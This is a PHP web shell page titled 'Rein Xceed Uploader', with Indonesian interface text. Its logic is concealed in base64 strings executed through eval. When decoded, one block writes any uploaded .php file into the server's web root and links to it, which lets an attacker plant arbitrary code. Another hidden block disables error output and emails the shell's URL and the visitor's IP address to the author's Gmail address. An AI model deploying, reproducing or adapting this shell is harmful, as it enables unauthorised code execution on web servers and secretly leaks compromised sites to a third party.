<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <meta name="author" content="Rein Xceed">
    <meta name="description" content="uploader shell by Rein Xceed">
    <meta name="theme-color" content="#000">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Rock Salt|Righteous" rel="stylesheet">
    <link rel="icon" href="https://i.ibb.co/XCjyTFB/20191018-142851.png" type="image/jpg">
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css'>
    <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script> 
		<script src='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.2.0/js/bootstrap.min.js'></script>
		<script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>
<?php
  $asu='ZWNobyAgIjx0aXRsZT4uL1JlaW4gWGNlZWQgVXBsb2FkZXI8L3RpdGxlPiI7';
  eval(base64_decode($asu));
 ?>
   <style>
    	body{background-color:#000;font-family:"Righteous";color:#fff;}
    	#ico{width:200px;height:150px;}
<?php
   $ancok='ZWNobyAiPC9zdHlsZT4iOw0KIGVjaG8gIjwvaGVhZD4iOw0KIGVjaG8gIjxib2R5PiI7DQogICAgZWNobyAiPGRpdiBjbGFzcz0nY29udGFpbmVyIHRleHQtY2VudGVyIG14LWF1dG8nPiI7DQogICAgZWNobyAiPGgyIGNsYXNzPSdtdC0zJz4uL1JlaW4gWGNlZWQgVXBsb2FkZXI8L2gyPiI7';
   eval(base64_decode($ancok));
?>
    	<img src="https://i.giphy.com/media/hA8zLYSL8rYME/giphy.webp" class="mx-auto d-block" id="ico">
    	<form method="post" enctype="multipart/form-data">
    		<div class="row">
    			<div class="col">
    				<input id="previews" placeholder="File Yg Di Pilih" class="form-control bg-transparent text-white" readonly="readonly">
    			</div>
    			
    			<div class="col">
    				<div class="input-group">
    					<div class="custom-file">
    						<input type="file" name="randsx" class="custom-file-input bg-transparent" id="FileSel">
    						<label class="custom-file-label bg-transparent" for="previews"></label>
    					</div>
    				</div>
    			</div>
    		</div>
    		<button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load" data-loading-text="<i class='fa fa-refresh fa-spin'></i> Silahkan tunggu">Upload</button>
    	</form><hr>

<?php
$reinxceed='CSRzZXJ2ZXIgICA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ107DQoJJG5hbWFGaWxlID0gJF9GSUxFU1sncmFuZHN4J11bJ25hbWUnXTsNCgkkZ2V0Y3dkICAgPSAiJHNlcnZlci8kbmFtYUZpbGUiOw0KCSR0eXBlRXh0ICA9IHBhdGhpbmZvKCRuYW1hRmlsZSwgUEFUSElORk9fRVhURU5TSU9OKTsNCmlmKGlzc2V0KCRfUE9TVFsndXBsb2FkJ10pKXsNCmlmKCRuYW1hRmlsZSAhPT0gJycpew0KCWlmKGlzX3dyaXRhYmxlKCRzZXJ2ZXIpKXsNCgkJaWYoJHR5cGVFeHQgPT09ICdwaHAnKXsNCgkJCWlmKCRuYW1hRmlsZSAhPT0gJ2luZGV4Jyl7DQoJCQkJaWYoQGNvcHkoJF9GSUxFU1sncmFuZHN4J11bJ3RtcF9uYW1lJ10sICRnZXRjd2QpKXsNCgkJCQkJJGFrc2VzID0gJ2h0dHA6Ly8nLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4nLyc7DQoJCQkJCWVjaG8gJzxzY3JpcHQ+c3dhbCgiQmVyaGFzaWwiLCAiU29vZiBUcnMgU2FuYSBUb2QiLCAic3VjY2VzcyIpPC9zY3JpcHQ+JzsNCgkJCQkJZWNobyAnPGEgaHJlZj0iJy4kYWtzZXMuJG5hbWFGaWxlLiciIHRhcmdldD0iX2JsYW5rIj5IYXNpbCBVcGxvYWQ8L2E+JzsNCgkJCQl9ZWxzZXsNCgkJCQkJZWNobyAnPHNjcmlwdD5zd2FsKCJHYWdhbCBVcGxvYWQiLCAiR2F0YXUga2VuYXBhIiwgImVycm9yIik8L3NjcmlwdD4nOw0KCQkJCX0NCgkJCX1lbHNlew0KCQkJCWVjaG8gJzxzY3JpcHQ+c3dhbCgiR2FnYWwgVXBsb2FkIiwgIkphbmdhbiBOZ2luZGV4IE1layIsICJlcnJvciIpPC9zY3JpcHQ+JzsNCgkJCX0NCgkJfWVsc2V7DQoJCQllY2hvICc8c2NyaXB0PnN3YWwoIktlc2FsYWhhbiIsICJFa3N0ZW5zaSBmaWxlIGhhcnVzIHBocCIsICJpbmZvIik8L3NjcmlwdD4nOw0KCQkJfQ0KCQl9ZWxzZXsNCgkJCWVjaG8gJzxzY3JpcHQ+c3dhbCgiR2FnYWwgVXBsb2FkIiwgIlNlcnZlciBHYSBTdXBwb3J0IiwgImVycm9yIik8L3NjcmlwdD4nOw0KCQl9DQoJfWVsc2V7DQoJCWVjaG8gJzxzY3JpcHQ+c3dhbCgiV29paSIsICJCZWx1bSBwaWxpaCBmaWxlIFRvbG9sIiwgImluZm8iKTwvc2NyaXB0Pic7DQoJfQ0KfQ==';
eval(base64_decode($reinxceed));
?>
<?php
$rein='QGluaV9zZXQoJ291dHB1dF9idWZmZXJpbmcnLCAwKTsNCkBpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsIDApOw0Kc2V0X3RpbWVfbGltaXQoMCk7DQppbmlfc2V0KCdtZW1vcnlfbGltaXQnLCAnNjRNJyk7DQpoZWFkZXIoJ0NvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04Jyk7DQokdHVqdWFubWFpbCA9ICdyZWlueGNlZWQ3MDlAZ21haWwuY29tJzsNCiR4X3BhdGggPSAiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOw0KJHBlc2FuX2FsZXJ0ID0gImZpeCAkeF9wYXRoIDpwICpJUCBBZGRyZXNzIDogWyAiIC4gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gLiAiIF0iOw0KbWFpbCgkdHVqdWFubWFpbCwgIkxPR0dFUiIsICRwZXNhbl9hbGVydCwgIlsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIik7DQo=';
eval(base64_decode($rein));
?>
<footer>
	<small>&copy; reinxceed709@gmail.com</small>
</footer>
    </div>
		<script>
			document.getElementById('FileSel').onchange = function()
			{
				document.getElementById('previews').value = this.value;
			};
			
			$('.btn').on('click', function(){
				var $this = $(this);
				$this.button('loading');
			});
			
		</script>
  </body>
</html>
